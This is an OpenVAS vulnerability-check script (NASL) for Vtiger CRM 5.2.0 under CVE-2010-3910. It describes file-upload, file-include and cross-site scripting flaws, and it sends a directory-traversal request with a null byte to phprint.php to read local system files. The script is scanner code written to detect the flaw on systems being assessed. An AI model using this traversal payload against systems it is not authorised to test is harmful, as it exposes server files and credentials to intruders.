###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vtiger_crm_44901.nasl 14 2013-10-27 12:33:37Z jan $
#
# Vtiger CRM Multiple Remote Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Vtiger CRM is prone to an arbitrary-file-upload vulnerability,
multiple local file-include vulnerabilities, and multiple cross-site
scripting vulnerabilities because the application fails to
sufficiently sanitize user-supplied input.

Attackers can exploit these issues to upload and execute arbitrary
code in the context of the webserver process, view and execute
arbitrary local files within the context of the webserver process,
steal cookie-based authentication information, execute arbitrary client-
side scripts in the context of the browser, and obtain sensitive
information. Other attacks are also possible.

Vtiger CRM 5.2.0 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.100910";
CPE = "cpe:/a:vtiger:vtiger_crm";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-11-18 13:10:44 +0100 (Thu, 18 Nov 2010)");
 script_bugtraq_id(44901);
 script_cve_id("CVE-2010-3910");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

 script_name("Vtiger CRM Multiple Remote Security Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44901");
 script_xref(name : "URL" , value : "http://www.vtiger.com/index.php");
 script_xref(name : "URL" , value : "http://www.ush.it/team/ush/hack-vtigercrm_520/vtigercrm_520.txt");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if Vtiger CRM is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_vtiger_crm_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

files = traversal_files();

foreach file (keys(files)) {
   
  url = string(dir, "/phprint.php?lang_crm=",crap(data:"../",length:3*9),files[file],"%00&module=a&action=a&activity_mode="); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);
